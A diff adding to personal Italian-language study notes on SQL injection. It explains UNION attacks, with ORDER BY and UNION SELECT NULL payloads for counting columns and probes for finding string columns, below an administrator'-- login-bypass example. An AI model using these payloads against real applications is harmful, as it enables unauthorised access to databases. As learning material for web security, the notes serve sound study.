@@ -32,6 +32,32 @@ es. administrator'--
 SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
 
 prendere dati da altre tabelle con UNION
+per union attacks ci sono 2 requisiti
+1. conoscere il numero di colonne da chiamare
+2. quali colonne della query originale sono suitable per contenere i risultati injectati dalla query
+
+determinare il numero di colonne
+
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+quando il numero eccede il numero di colonne da ritornare genera errore out of bound exception, errore generico, in alcuni casi errore http o altri casi no errori.
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+stessa cosa ma se il numero di null non matcha il numero di colonne viene sempre restituito errore
+bisogna capire bene la versione del databse e seguire i comandi specifici per ogni caso
+
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+
+utilizzabile per capire il tipo di dato, sperando che inserendo un char su un int generi errore
+
+
 
 blind SQL injection
 non ritorna errori o risultati evidenti
